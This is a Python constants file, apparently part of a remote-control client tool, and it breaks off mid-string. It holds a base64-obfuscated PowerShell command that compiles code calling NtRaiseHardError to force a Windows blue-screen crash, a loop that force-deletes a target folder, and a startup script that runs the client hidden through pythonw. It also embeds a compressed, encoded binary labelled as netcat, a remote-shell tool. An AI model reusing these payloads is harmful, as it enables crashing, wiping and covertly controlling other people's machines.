from typing import Final


EXECUTE_B64_BSOD: Final[
    str
] = "powershell -c \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGE9QCINCnVzaW5nIFN5c3RlbTt1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7cHVibGljIHN0YXRpYyBjbGFzcyBDU3tbRGxsSW1wb3J0KCJudGRsbC5kbGwiKV1wdWJsaWMgc3RhdGljIGV4dGVybiB1aW50IFJ0bEFkanVzdFByaXZpbGVnZShpbnQgUHJpdmlsZWdlLGJvb2wgYkVuYWJsZVByaXZpbGVnZSxib29sIElzVGhyZWFkUHJpdmlsZWdlLG91dCBib29sIFByZXZpb3VzVmFsdWUpO1tEbGxJbXBvcnQoIm50ZGxsLmRsbCIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgTnRSYWlzZUhhcmRFcnJvcih1aW50IEVycm9yU3RhdHVzLHVpbnQgTnVtYmVyT2ZQYXJhbWV0ZXJzLHVpbnQgVW5pY29kZVN0cmluZ1BhcmFtZXRlck1hc2ssSW50UHRyIFBhcmFtZXRlcnMsdWludCBWYWxpZFJlc3BvbnNlT3B0aW9uLG91dCB1aW50IFJlc3BvbnNlKTtwdWJsaWMgc3RhdGljIHVuc2FmZSB2b2lkIEtpbGwoKXtCb29sZWFuIHRtcDE7dWludCB0bXAyO1J0bEFkanVzdFByaXZpbGVnZSgxOSx0cnVlLGZhbHNlLG91dCB0bXAxKTtOdFJhaXNlSGFyZEVycm9yKDB4YzAwMDAwMjIsMCwwLEludFB0ci5aZXJvLDYsb3V0IHRtcDIpO319DQoiQDskYj1uZXctb2JqZWN0IC10eXBlbmFtZSBzeXN0ZW0uQ29kZURvbS5Db21waWxlci5Db21waWxlclBhcmFtZXRlcnM7JGIuQ29tcGlsZXJPcHRpb25zPScvdW5zYWZlJzskYT1BZGQtVHlwZSAtVHlwZURlZmluaXRpb24gJGEgLUxhbmd1YWdlIENTaGFycCAtUGFzc1RocnUgLUNvbXBpbGVyUGFyYW1ldGVycyAkYjtbQ1NdOjpLaWxsKCk7'))|iex\""

RETRY_DELETE_FOLDER: Final[
    str
] = "for(;;){try{Remove-Item -Force -Path {{ TARGET_DIR }} -Recurse -ErrorAction Stop;exit}catch{Start-Sleep -Milliseconds 500}}"

ADD_SELF_TO_PATH: Final[
    str
] = """import os.path
import sys

sys.path.append(os.path.split(__file__)[0])
"""

CLIENT_STARTUP_SCRIPT: Final[
    str
] = "cd {{ TARGET_DIR }};{{ TARGET_DIR }}/Scripts/activate.ps1;{{ TARGET_DIR }}/Scripts/pythonw.exe {{ TARGET_DIR }}/client.py"

NETCAT_B64_ZLIB_EXE: Final[
    str
] = "eJztvQlc1FX3MP6dYYABwRkFFBV1VFBcwAE3RFAQxiXZEjBcCFkGQYGh4TsgJgoOqNOIW5otViBWVpZWLrhUKAZuKZkZqSmZ1eCYkiGRG+8593u/MwNiPf3e932e9///PFOXe+527rnnnnPuucuM4XPWM1YMw4ggtLUxTCXDfYKYv/8UQuja/2BXZo/dlwMqBWFfDohJS8+RZatVC9SJmbLkxKwsFStLUsrUmixZepYsNDJalqlKUXo7Otq7UxxRCoYJE9gyB7/KieDxNjASqy4CoQsTA4nFEIQMs747xFII2ZQ6KZePdAso/bQxSWS+ICDjYhgZVxf/SLkqUstB7AYaunQyuKUMU9/7X2BCHcO4dpLt+THDHBM8uZk3q1zMQrxnJiUoxnIQ3Gc+EzXfOyWRTQR4Hmbg2GHMTFz7ekGMvMpbzVUsRlyFEJBfcx6rF+SdlJOD8GKkraxz2gqZ+VXe6Rw+whvgEeMAIaOTfkNmIuUcD6oofYs7qcdmkH5l+KeO1lvyeL3OKfrv5//WJ1b3U7T25ujy8+uCmJIq1q021F2M+RCLcIpqRURT2+q0Nx0AlnULYgzuUxhGe1NkyJ7OMIYZTzFMqaKpVtGE9XSh7tLysOwg0l5UFkTaQwT5DqWKZojEhg1RDFP+chn2p4ky6CGld4mCJjqpYdkMwHy9yXAhHDDnYwm2FJeLOBSicoJL5G4IHA99VRuehSo6N3fDq2BFSvchAfq+ho+DmAqCDxroQ6RYfSLfJZcnx7xh7fOiMK8H5DWmt7W16VpKDw8x88dZrxDrgZjADSDkeYGBpRCpYw8JKKMYjlHIOMOlSBhCq0B3VFJ8D9I+VSXnJCXfA6Q95jw3/qiICdwEjdlnAl/CqH/gixjthUKfKq7YGjMmBfaFSGOwwI6xoYDHzj6HmNn3aEHbuUqgus34qs+lxoUAWLRDBTYoTO36EoqKs7ASV0jbNs6l7QQW7Ryx3fG2xkntywgtv0VwZYM4VGILVNL21QljjkL1kksae67GrUdtbQbJNA7DD5Ao3TOY8lt70xXaYNM2l8swmYa4h21t6zuWC83lfh3LxeXiT4KYE20Nqetpuuljkl7PpV3L47KJuPujeBYCisQQEKSjINQl58gKyDoh+V2hSOfsbpgRggIvhgZ20ADbttWdqF5fyg7G/uKr15s/kDb2BGmR7GMkn1VNUDhorCFldNIqxAIuu7hKc5X0EV8NlWeBdMnK3VAMFc3lMhLfLHcgcVMj6pRecVMf26T7augRvaJZH3tT9/XQal39+CPLFtP0haE1uiadwnAIkRpjdfVWiuYjDUIrFFmd4rplOvamPrxZd2boBd0dq9gmwcUj14RWsWJ9d52U9NKMveiOWymaBPV8i+s6qbZaMCHesPRtvcIwVNFkfJZSROjQKRq4fgP/ol/dRavYm+a+sORmR/wNSz/TKxoEMCRF0wTFzWUO0MsERbNk3QMQDr0LcoSwZ+hRwq1SkbACY8KqCizQHpPNfZbwFAXEGvNRhswVSHPSqNZaCn+pfrjj/HuFMUyFK2RycxTgpZHWWjtDGsUM5844npYM50sYvqR/uSsxZqyDucBoz8ECMoHiE9WcHYmptRbTGoQusIBd9QpiokLR6iik5VIOFwcQcZGU2AAV5YgOVFhSshlxurjxIxp/lHXTu8h4XkDSUa9wQJSvg14Yh7cv68PxA1sbpQTWVgkqMDYK1pP0BIW4YDiByBQ56BmOIefa5UErQhx7yILBtLmkeAU/QL46atPoQs52n4AVAwae2K73f2lApx/AgHq1q6qxNw8IGE3owNjBgh7NoPbY7YkEkSqcMRpv24FcbsQ9Ox2xxp9MBYyAmrL7NrS17iiRcQeQcRexxdgqUQoaz9u070SqLXBm2H6d9AFd25I2RmtiKCAXxR0FAttIiitFHejl27ER2gI3qLDl8QpCjnivTtqBoSJrICeI/vfb2kpA6KIBR63iJtEShYGLrhPJlXLWyijSKprBqDVzgmDPQQGBGoNe4axDl+AyVm9cjfIa28w1IwZGd0TvIiUT1QSmIsxdrItxF2Hf+6YR0Xi6Q/VqriKKNFQYX61xgQywk3rFZbA/QB1hllxbcJNBfTIXGW2BZgFR1CapVnFZQBDh6BbBzGkLrjMsqy0wMJqscoZbEUa1myI9MknviC6F9kgQUOmA7ggK8zgUZgd3g/M09DmQVo5goPHPqeCMiKzIfLWT8cpJyI7TwFekVFL8QIDGoUGnuNxeFShHJcX11PwHidAiQD5WQclqXARNKcmS4jW8tmkNgsckyQsR/MVA4uhAZgDVRgVWFnfERUSkjkNB3CttdRDMmtQSzWpEA56YaOpj/GicYuYHx4ITVvy4iEF7g6cfTU//v1Qlo4afqLEdqPyLIVbSIaZNeYy2cAvaQP6RZf6gfP6c8hFi3awea9XTopW2wJVhxXqFqz72MreMBqGj4MpBuOLOdNBJiR43fiWk43ZorBGiFLgx7PjOFXkgb//bK+frf3DKib6uaf5Xd7S2psn35vXsSaxpoKwJBwfaGKJ3NMnsP5l7poibezEg4ZZWWVGnov+VgFoPyT7p6thLWEhSnykuWYzxQAuuhOfNC6DGsR0ubcF5hrUpLLjkr3mel4YEfg0eIfks9tKTxzugiBtvfCiMd9hf151A6/pAXSSxQpTND0RMNPc85bO/pOR3hmYIORGaaKae7UVgorftF1x7szdg9kgadzAmJv1l63zT8jaT58LfDCiODmh+iMWATFJvU6O45G8cBH8nGfv+pRKaiUUs2mMxc6nb5Qm9ONPdo5TGDmRXBjMLROAyTuZZTOwCzPOJ6vXUJ59Wq2jmFpkGLrpM/TM8WTDsnczgkqMtaGZg2SV88iXK1FzLcB001waJ6CLlYLlk3RTQYkpKKXicMe7iUtBWuuhoxqF3L4UVS1vQxGjmGDLGEcrF9nR7V0fVfn0wSbvSkXU6Un7/jOME4guB5Qa2K5DrQkSmuTRKZKIEfORQbu0rhVUAOjCO7UDJtbGdU2LzzynZjZTccARK9GQ9vowrD+XAehFZoXWTxXqOEDUhRISLKKRS+FQzsW2aif9q1xa70CvY/SLo3ighc+WArhNAxizoEkS3K+25dQzfM5dJCPhxjIkAhq6EnDtw0lxA1shuHIRFu0xFmCoIokebJzhJjTOseohWpvkxcaHSpI8V66IcKnsMhq1GLDLKmR8kMsrS+NGZRBeedOlKOEloDJICt9INbmM6n8WgSf94FluRjVhiZiKnDadAGyrPDvkH1L402kytM6HWGVcWdN0NC0d3TvHaif8zitVdLCnmOuPJQbzdCS1ibigMp9jAPVgFuLo6RT0nfeArYT9t3PmCmBvOedoVnvcazo7idQh8PXAv2FBtq5DNxaFto1Pbvu+XSAMxh58/tMCCUq6g8QjfTGrZLOFJzWbRZi902punRbN2+CRcgXGW4VffzpnfLfAfM1++Aph/145h1pMOHfhTPUTX1YISsruyHmXWMkxv9m2fjve1UDbMYDtmTLDIIEv5MIsMZ8zoZZFBFgGxr6WaXghguN0St2EuurmJKCVdGMpCSbSdS+3koh1cdJjT28M6RaVeUalT7NEr9ugUu1NrFXVYfB6LIXEOE6cFxBaLiVQ5gEgZPvYhx4nv+7TnMD3fkyLLSmPLtEe55XQerGSxDrzxXOaDI3ArX1wWRBcXd6gLkQyaulFUj02a4MmThqBBTrB6gk3roQd9xWMRA/ZWLyf8MsYaauSdi8kN/38sJjEoJmdsOXmNf0CYX3SzUki5ZGhE96ZGcZvRl2Q8RAeUDQVy9Ca0pZsxG3mDiI+THFkbySEsWkSIdjZNJDkqNqZBz7441hhuTI2l2LAEG1pxW0l7TY/CgtuOrLS0RP0Qc5tqGEfYygksapnLVptBaLxacRtrki0qoXq8olldrg9vKt2MlZB+og+EH5Z7UBtCDVjuZVP4Qbbj4d8Ndu1IYlfR4Jx41NZmFKw39MGs1kw21tBtZOeTNmb8P560xThpvWxMR/SGviPJ8WfRTTEv3k2U440fwR/JvtjbpSVDOL6tliJjJPsUtwMcNVJTdg1jj/lcGvuzoXS+tYKjc7Mf2aA78H2+642IAYs9243DxtoVFRCnLHcSbraDRGa+US45cGuSuHTzEAu2LfAmMgKyNZ5SXRp7m2BwsGQAsbK0SYo3nSlJSf82wmmerO5QQvxKkGIBUfwWgUCyX9FSunn+I3OfwwkCMe9vDZTsL8HiAIFGQsHUIwZxgIC1M4gRI/RAdAOYGzhlCIy8+BisORy4bg50FDie5I6w4sF1uOYEepLcOiEFl08L7EtyyjAHweV9Ap1JzhLM6UXAfCE6ubA+BPYj6QIsGkzApVjUE4vGkPQmIQUBzyiSk4U5owmYiZVvIEXjSPp5IQ+uw94aEzE9iRTt5kGgMIDkFGJOAIfZn+TMwZwJBJyNzdcj5kCSjseiiQSch0UaLJpM0qyQgoAniOREYE4wAcOx8jSsHErSc4U8uA57awzGdDQpqjWBHGfDzFwL4+ieTnKewpzpXH9TSQ5eGAROI+AgRFqP6adIegiCMwg4GIs+xXQkSU/gQcATTnJcMSeCgD3J+DH9NEm7mcB1WKvRGtMZpCiIB4HCWSSnO+bM4jDHkJw7KECxBLwFYONYrPEMSeMmJnARAW9jUR8s+nMYppsFFAQ8maTGJczREBBvqBoRWeB9UvkbE7imGsEHJLcGax2HP5U7Qc0bsaTyEEIHEDqJ0C6EvkPoLYQMCL2G0B8IbUDIRgvQKoRcECpAyB2hHIRGIZSO0GSEEhB6GqFYhOYjNAMhFULBCC1DaBxCpQh5IbQVoUEIvY9QL4QOIiRB6ARC1gjVI3QfBKTyF4R+Q6gFoV8Qsi4GCK/kKp0R+hqhQQidQMgXoc8RCkZoL0JRCL2PUAJC5QhlIbQFoQKEcPGqXIOQFqE3ATIurfwQI03lpxhlVZ7GaEHlJYzmV97AaHblnxjNrBSXQDSjsidGoZWDMQqsHIPR2MpQjEZWxmDkWZmC0YBKFqPelcUYOVVuwsihcjtG1pV7IOL35JL91lmwyqTiSRE5acOTgdKoIL1CBiuJm17hBpGrXuEKkTOe3IK95vbrDtx+XYxrCawBeBPmAT6iQTSUIUcthvuenCvZeA+vaMiJA7hIdKtxooS7PLsDa7zRlfSqrQqiixeuf4YmX0oN5gMag69pf+aZWkuoFjAcma4cmc4cmVKOTIdOjxVsYCkoF9MraN7ZHeBJLD3JJ34oSYvoPaMh15csowRW+/K3jAYVZuOCwvBMhA1Fbn+9y2g8jfHDtRvWMTqkwYDaMIm7Cz0LYzeMasPzDXrh6E6Op8jCeQELeyCVmMk7feWQact37Qk5d6GGYfYQQif4fzxjYJTaKpG24QHxCYnX/DJ6r9waxrrpuVt2fmuBp+FQZS9UMTpxZdhdE9KwEW/WFE0n6D1kgZjR2JItmDGgqMABn2rk0vQIfbyDXiM29pXsswGvTKq7g8z+emi1tlqgqzc6amsEWqOg5NLyqzAX5ls4g7cPz0A9d0Rr8rLQ5wMZGmSRzzNStBJoCwIfy/IOhBD5DN6WBkCTVNgZkmtHw2k53wPSz3aF9g0C3AbiMl9dcolwfBBi3I5eWz3yxYEKwQ455ycBOH4w5XODXtGgbW2TlOxGv4EcNTpR+QdEfohoLnEfSTN7vtl1vEvQuBkaPYh/JjY3icMmnqTJdb2UECDGa0GTDwJEfEaYnI01YCt258g1oaBOz5S+WIX1fjvyg1BwEpuJqPOHWuUGzUqnZOtFWkTyggdHx5FSLcFdq7ujqxNUCeqONFiVimyxsSvn5pI+96M/WiPo0B9eb2sf2UrWsiB5ZquhsdXVN+JUcFQuL9USsrhWiFlIfUQR1TVrQowDZQprh92g7I8ynALv7Ek0EhecY1kxsmzSffDoJHpyRibC0+V3gYdANDdoNGYDAQuhFx88NOJmjSONZxV3EkIGfMubu2nBfbs7YVXpiwytWmXB1Te8+UnHQVdbKD7lA76EKlU0dDbsru6Ww9b0M3w/qKMsHMaBpYKxNKZbSMMjC5e2LxCgqyfnV4MsRYt14CaLMLKvYQWivsifHgJmA2J2uNeBZbkPUORLlc3aY8zcZxNMp7SKph6gAjC0DG5orC1k9Yas8hjIqGEmcXGQAJTKARyEz3n1okev75ANBmphCyBJpatLCS7l6GSTfT1HPlS5BVm38L0AHWLLQOp0G/DmjZtG2GhJ9geJJfursMblgZZtW1InKG6xbpL9sSRlYShkq2DQPf/kNnNSQjPyM8iCn1+OAHKPUPIlxTsJ5GAayBXGZAHeh5o4IJj+FobtRbqy2I8fBXvSuIsTCDpgHskr1Myal6BB7YbIjn8yfV4jOg7+6gB+8C3GLpz1nYAbDyRI74I4LNbYqau4NbZlOMPNHXCpJVUXNY0mgqZR434ou5uAMQ42fDMcR9Cka7LiXjMINPYErmGERgei4MSOay6UtLAiXZPR5xA+CjX2wicbpgb1tIEtV/fHkktQt54aapP199PH4gKdqou9DoNpIMsLGuOnyKy1wt6KCLYtRA1gOoHyBhjjdYv5nY81f/0DjZGigTBEglwgvQtStZktuKW7DuLRkvsLv4jdDCLdOvPdGt4fxi8Q/FSWygiHLcR/ME5LN6bdqzeMDAtJVYeKUFidje6WG2KBRa1Qi1rl+KekKh9Huhzp9wL6aaamOwHIWRq4UKS+3iWKb4UbZREnGw68DcOucAawzU/9yQ5ZV62930Y4uZ5wsgXx40BqGSFTPo2HtAVShu1PSrg7B4KP85iIrbs4lNi6BhB2fd9QIi6chQzvTyUwRHiIW1iljKYLqSopfp2oAF5a4+ECojQWkE50R/lBiKUWAu7Xn7OKsBSz8w39huKTPrID1MRK9msaSFN6evhFP87isSYB2IEDHHuXuFTENzsDbpvhO0/Tkp/ZLMArIcm6fNz/i1BPoJ/hkv3x7TAvopjnmTB/ipg33iXrXAqvzmQAZFNB2NiObSYPuMITr4OncfwiB+l9+5n4VT6ijL4EErnXYxf5zTA72WY3j4yiVwsZEXH5wjzJgcoQ0uMTePigL+Wh0flQG+dg4mbXcKwv58Sab1mIfB+EYYFa2hJcxnDDu0PI4WYE1NZZ8R2YPGPbvpxnzEtmmxtBasgZQl5foqxy3ZDHLqXKVrKWxNMHTaHttY2e3BjGDjE7zia1dtDHSnntpoZyGi5QisvagsvMcvqa5kURY7kyuXDmYSwMrsdq4NeV32GiwQm+bHnk/qMbZ29ByIjieWPNPb9bejGS4i4Ccs2DjKUCC1hKww2WZ3/b3EzSShCFIKK9d2AOg+i8SKhSzlvNsWvTYIqOu4AaYil2zX24s20XbMzLzyJoYByq70vyYI0+5UHeElgq/CKK228wihpfcZu5oh2tqKIVJTwRYPGFdB3Z0odfR+7AHNwhA+CH+eNvhDUZPGvwDJ1njYWwEuOW8btZWN/0YMjjmT1CqiL4kAcRIyfjDaBfzvg2AM/rqHckxl0E320YIclVV91RYsXQB1UAbmbbif/D3nRSyB77SXQeu2Om8w93jk6Jic5O5rqGR9uRmiV30KO4bKkk13rRuxJyHXm5F2dO4i+XXJKsRtfYJB5BjPnWk7xTdqeF2iqZTnHz7+RvYO/28rcY5W9ME7XwVKxep90TNbpJfIZBdJyW89/LNP+kiDae36sTmXxzkMmvkeyvaycqK++Qa1JDyiDTMspdlRJ/cBjsKK15n1tKHWmq2y8MIjs8W/o8i1vtu4EtuAMr9nVTPng/UEsu2R9+B5GRrcFR3KhaPDLBYXJTvQkZcvE2iu+/VL8K6zffIhPK+VGGVwfiSNCAQqrDPN/raTnPzT3Nho+/FiGPwV2mEZkXP+lgurondwcJK7WA7WnwHEgfsiNFDUhR0i26LMDQJZwoQ7MmcP2M+am1RDEBqzUWWDOd36unLyE+OLYT/sHtdZf14GgyDWc4NxxuQzGYGw2HlTPNpCPYM6VWIGAoHGDarf/dCH/oYR4h98J5aIe+d/WgrCTC8G6Px1nJ7ebLPc0nI2IdUPHgV3yZJwVfYz3uDPrGIY0obI41VgHlePKCD/u61FhN5E5gwLWsFtRYyfQF5DxIcb2ctKiaUMMMomBADSNrHItbWCkR4Mv4VaPxmusFM2CmtQapFd6wXca3yGRDWprdRe+CLXVNpW7CSiLXNcM1140u0A3Xmemv9pagpEXzi15zfaiG67k0SohbTeqhe+o4Dz0G7KAA/B1SI64LJSxQpzhvTJXss60yiCT7qnSKOn1snWTfCj/Yi622AvRQhPlHtdckutiOhRwFUCWgf243jJbl2UOkjz2/Wmi00SvO1zDeWsV5gbaWkvkSFNUI7fXhl7nxEd5b2p8z/XCoJS3E+IzE2ci6yb2TlJRUcZdZ2mMB/FaSTKDb50Rg4sV6jUMjvkSU7LMKaNMsq7FeBsjbOBZh3n3WFqMHGuvPH+EBA8APuaxHkPUAr4Jai6vYKbrWbcuROXzDbYWQOojI+FM9k0RaWUhkpDORSEINkkmnRrIug7gtlltgQvdSemdcq6gyWOGmvhKxfN/PfBD4XT/imnHX94Xm/N/6mteKvcgwxWltwWmmXUVSeBwrKuoJRS7lYahRsfX60PWiCQoxK9Uq6gVcJjNBUZ931QyDN8jB2tZJeX1MDcPFurD1Ii4p1R4V6KSptYqTQrzduszw76bIe9Lr5fIy7mkgXpKQBGaiTusU27G+ALXfPZvzsRxqreXUJhhZeldujKb9nkeCgQ2TjDIux4X8DT+vPSLQh70gghpIFsoZT7VBMEFxPu8rntIbQKlRalEBS8t5JiWDy1U+nzOFjgQgex03PB9267h1O9eduyk2isil3hWxLBV9R7YLx4PGRfhW0yUGd1TYla66MhhF5FvdFd2R398qD+C66a93Qag8iG7IxRZidAzJQQSlsYchT/qEy1e0CYY13emGDFbrCMMt2ECSWzx2suFaNxSLY1AxEJUox8B9HUbImI4b1nezNI8vdOPMI3koPkuEX5SRlOCzzlLFHiyf4kY9HqCe1cfu0Ssqhx4lw9Ez448uS7Q8nkbVDcNeH/7yWK+92/XqzPVKWNWezwspPZhorLGiLLFY3F/hEKGI1TEm7Xmzj9kVMnNN1s4t2CWlK0fJpeVq8joDhC2GClsd1Y7HpK3OJG11nLTVtZO2uselrc4sbXV5ZfTpunGwDnaGxL9RlAHTltJdhgRcV5E+vAxfRw66z1s8NzxgBM2WFO9BphzpRbzKYhuyQaTbpcO9yUKaSxGBYz+N+ut3epn8df6oME7HNUroTfaQtOKJxyvOoRXH9rboqrwX7uN08df1Y0iWZrtZhzWsrr4ClZifQQeobEwgbS0ngS9+6Iq4YAq68jmXIMfojdgDCfYCS+w9OmD/0JUY2aKC62JAnGdXVNCAQO4QuvLRM0ioPo/I/08giZb2CbT2CqPpAeVLsDz6J3rY3ziHsLyBYReaMJVZbp29CN3k0ghZss8VVWVZIJCaRmegJ3meA1MZZm61Dh2kegGgqh+qaOCub3T1+J2K0cS5AMc0mbdBPSjtes123WhwdH5G38popY+/bnosgh0UbNctNcn0144mmV7WGzvajh1d17v4mTpCiO+it8nMPQKfzGDnyps5Yw9ydGxDOGCfqs28Imh8GRZLzpiZdahPV177SlruPabkYxwtlXyko1mVLZbBUmCP9npT23MPuAXxae3NON0ZQ7wzw3/No1ZxnIsauIi8xwU7e5H8rSd/a8jfC+TveaxUx9U9TaRk6RWyJSO2chJMcUUoJ0IkwxszplGZkuHzFZJRbs5wwIwgLgO3+ob71yEjzCLjBmbEcBlPkSWbZHBIycwXgN9ZQU7Y8E8NIzC81sO0qFjLQLzJERY5OdJOFEhKKvAp7BSRHr9iiA8RDSsBpQ4ypoh0rjxlasyrhixtFeRaXG06WL7toUeEG1HCX+/R/qrzoYuFcZxn1ksl5BNNoys4cYtfRww/XQM5kNNNL5qNqUhEbUkb66R3Ifmt3LdlLJuzMr6s1MGKMyR4AEOvgepdyFhhENwXtOyp697qwhkH1gpMv2UFR1rh204quILH9bmQ2Fj06WQaaygz9iwNaaNv+HWt+J0CZCP6o+i3WkH217qJjSPR/5p6QNs6SrLKBldwUUnrC+A7NsDYK3DsjT+Q84p5/G4FgcY/cXOPz9Ir8OVd4w0hMcQpfB0E8KkfWpUzOJE9YHiNx/hGOIxKZ7yGAg4661q1DW7jWzVddIEoE42vQzXUbyCgEglIAwIaV2NbPODTtoqX4bzcxKLwH1A/ucnqBpmeOI1PX0NJJdtp066a9Eq9DPmPuKuu0hZUMWwP0lrvgpiPXBOWOkv1iiodd5SIL+4xbsTzFEODEy+6hrFii3E0Qb4HnhJXzOetTDpxas1pNBX4cwRcG86gPkTy1zbAyD4UPM67xlcEpkMBkolAYzGPoyKOG10aX4xAo5IvtjwDWQV6nKpTXASjfxFW1aAOZPR4AW++kYwhXI8LeZQINHYXME/i4o0fkIvH9Yrj5AwCdoKNaLnouk5QINB4ljGt0SQTgcaDzOM74Ma3GNONH8lEoHE9Y8HrYvD5KtATo+6YxsVyLCNwLBOumr4PbZgG46oI4AwSyRiHGeh4ct6bC9n7S40joVeW7xUBY1/Db90s3N9gxPzDFf6UG21HFGShWcJ1wQZpW3wGLYIWdKXkgwdEYxbSRXGQad3vxs1J3+7U2RMwhu1XkY115AEresd83RNStOtkhtFYepqPDfi19mmyjUVa9giozbPi8L8FbSs8+S1mSdVyF1KVsikTB+PMrQ4p2NUAIIFIlOm7R2BxkZjBFlNvWcSLwC+Edu6KtCes3EQQoF0XHqany2z7rxAZNkstXnbQCwBJsUjAr2Qd6VC0y7CU7nevEek+T66NNX3bU8kN93kcrsf3OCOxFyX7Fee5w/AG82E4OW56D3YJFbjFJfvckqplGfyUOJrerUw6C9aGy9VITLmev+HE/6tvVH66hA7uaQF4sn9CuwB3w3IJkQY90llwGUsvc3d1r2DOIsjpwA9SuAMLI/hCYK0Fv+xAcNB5JJdFF4E/9Y24W+dcBsiqgawLj/HUi/I0T0LXFx9YQ2CpMPEblr3xPxB+XwB+X2A0Urp4EhYfvdSBUMt5EnDtaqBdzV/NU8Elct94IXWCoiY3ynIYF3CazUolKe5DlpzYCzge81zWkYPEa3jkSMClVEAabwpMQz/feJV7XnKR0Qyy0NOehtFdyTV0fWpRQX1b/zyb1CJwtWREaCzc99ENHE7ovf7JAnXjWgeB8qFWBrvysLhk6UUq6M1fiXIydmipIecq5FZZVy3ZH34e9Ys/e70OkyAFp8LBQtKOIC+f/84krRYy/PxpYpsoIZrFvDyrTDXibqE8G5/9XMApKL8N6WUh4nkOBnwGS15lsqP/AWUXiCWt7+SRGH4f1/KRWLOA2x8/djox1cG0UKVy3zoiM72RzorRGlz38wIy1xNgklY6PTIrifmb6WZ1kZT8CPbagL+x8y8/N/sZh9EbhmHI5LapoM/juQtN/lxHjLpd0cW8rd/ShX/aZnpeB0XH9YCp7ltijYvXAHyMg3cjXMnBDQjvpHXWAlzGwdsR3sTB89YBPLGefiPpRPX6No9C8HjXQzyNxvNpnELjETSeR2NPGo+m8Roab6XxahoH0DiOxkE0ltN4KY2LabyYxmE0LqNxGo2jaNzwCe2PxvU0Pk3jNTQupHExjQ/TeAeNq2i8ncaVNN5N4+M03knj1TS+TuPLNH6ZxmU0PkbjPTSuo/EmGp+n8XoS4zRw061XOIA8OGlbrdiu3Pdrjjow5PdL8E6WbixRtvCMSMx/BwfrmK48mE/I94i1/la5PtrAHSA8Qta+1poADH69QSgpRrXDb3QX45MYggPP+gFNrXVKOfdjGCAnL6OcHLYjulVSVbEJl/fiu3TT9NY6TsXqH4IFmo8bNywHrcTCKlp4CJ/TudCCknMV88oRxcfYnyO2KTnBjofxjuHIE3QgRq+Qmi6P6fMsfLNji4/Q8XbdGtFxG8T5FMIT/O529P5kE3WEeJxcLwzl2CHnqiCm6D7+lRS34gtLKyBF2FanrRZx2Zpf27Pm8e6Mr5p/f8inqt0vzOB8bN0apzs6Bn9LK+r1rXGv+9S9i7CkuILB3xuSbMO1aQtPoGRbS42AtdU6bkVWtNQU8rDwj6P4U198UoRJxlRTTJJCPiktugZJEZ+UtRwx1Qwq/Emm8UadL5RsC8Qoty/2DKmSc4sHkIZBrH0RqYyyMje+mksU4lBraAG0MH5Nxnfpx/bjxSvj+Fbu2+c6zYNSDdll97TYZeN30ue5k0cXKFtyW+4sBB+SuLmjeBvGQJbBz5bqQ1zJCV18s65ap2nVXdAVPNCd1Tjq45v1mlY9JG7GV5cqjmMfbpyIkO12H1tyNYu8PYCzB35lq0gjg10idkSqrLbBWbVEkwvqEMRe0ivOc98Mc9DFVpmegBG1O46yV2vDIbwpheqSzYpaQA1RjSXy4VgntqoQvBdJcSTIaWFBLUAK8n3K6+abz/MWeFWWBOEBFdCEp1fINzdOGZuQYVs6/P6SX3kZLjbAImBQwQNc+9qNq7J4fRDjhX+0rba11mVUyZZd1LZ2OYTZy9L0gRiXtGm66sesRqiFDUV7U3Qf83N2f4Y/91Za0KAPER0gv+HXpJdaOWmrxTpwY+4ZYoEirqr6+3Zd6x3XILYTGqdD6wFYr3cqOad5D7CAe1ChDxGTH5S4T2TCgUMg0QaR66Zo/Hop2LAuViEi7T2p/iNMsZO192TsEu09MduTnnvRF5Vx0NSw7CG29PujFkWVHVB0lgFUQ88W3SbUjx6n01w3DpHshwoozJpkvkjwB/SgK7jOKhH9MECv8cUvU+AXBA35+LM8gyi/9dKhJ4tukDZ3dLHXD4hopRh87VrtQDg9vl6yKgDfxuQhV87iDzW2p+GAkLbqh6iPUw/BHUdwGByL9e1/nwpdnBj099Cp6dlWRxKlUSJ8IeASQ/w9TeOJau731Hj737csCWb7fhs7ENxyhzbn10naKNA0oxDFQ08r9gDF+Btn1T6XjEJddWmIQO9cgtVghpqMx0348GzScXsZMdPCE9W11tup/JwwblhPX/FJy3dyTqFtqbIVnxuhP4Ibt+3k1ziOE9MvwrdeeiuU9M1W3JuIGsMu8gsZGgcQODGIhW60e1udfq645JLmGx5HNleZYqYT0f733kzd+1SR62rybJwx3wHeFeIOhVxnAxGX8e6bQ66zwkv5EJHhPtQoRzp1hFodiCb5vgGh4JYQLTV+j7Pc6Li+w/yY+tfH47ftHSkJHP94DFuFeNPF8+EcbH6F4+s19sZQvXj8d2x/cH4nY+Pf+ProK0NNiks/Tax7iix7KQIzzjiujvEitK0gRNcZLz1OH+dP4FerJ6u7gUuhsTZMeUQP8E9UG/zR2UXyoYbmRq31Tro48r3c47xq41nif1BGg/aRiqa1uuN4T9NW9evbf8Cnor7bMRpX0XgnjY/TeAeN99D4MI0raVxH43oan+d9Qhq38j4k9bFG0Hg+jTNonEZjNxr70didxjIau9L4AcXrzPuAvA9M06E0TqFxNo0daBxF42k0buZ9YpqOo3EAjVka3+R9Zpr2pPE8GsfQeDGNRTSW8nho+xgav0zjTTQOpfF6GmfT2I/GGSSmXxRR7iZbiCAnmOrxu+nvgpD5xZUuiZMghJn/fv6PflDX8CdtkLeesREzIiKfiRjKsMnZjCYlm+F/X1eWo8xiZR4pI2Tq5NwUABi5j++o0WPGjvMbn5iUnKJMlcno/AQxzO6koP/cgP77+UefjPSkBckLvXx8vFMyMpiEp3ITZioXpOewSnVIRmJOjhJ/tDcqMnp6XNjshJDImTMVITGMlxfjkeMvU2Wz6aos2XyPnCGy9BxZYmZS+gKNSpOD10jtKnh5YZUUlTInawgrS8zIUOXJErNkieoFmkyQq8fqeyT/w/pQW618TpOuVuZ0rIj1NFlqZbJqQVb6EmVKe6Lsn1xOiLDnEKRnZCgXJGbwZV5eMo9krml6Vm5iRnpKh5L29HVGmqnmlMT0DOiVVcmS1cpEVinLSVNmZMhy2BSVhpVlp2crR8iUarVKLQuUeeT8Vf30rMerm2srFyuTNXx1phM8M5WJKdEcLmVODtLNpkFJSvvumWcS09kpKnW4JoNNz85QRiYtVCazOVwdf67Kk3pthyma68TUawzpbEoWNElnWWX7bjHP0Z6ZHhEzU2b6MJODQ6dYJINDQhTR5uSU4NiwGHNyesSs4DBzMnzK9DCFOflMZGxY6OSwyJAZtHLUzMipMxXR0RzmsJmK4NDZfOWIyJhoWhOToYromODQUFCNpwnm6KnR0+fwuBlAFBMZM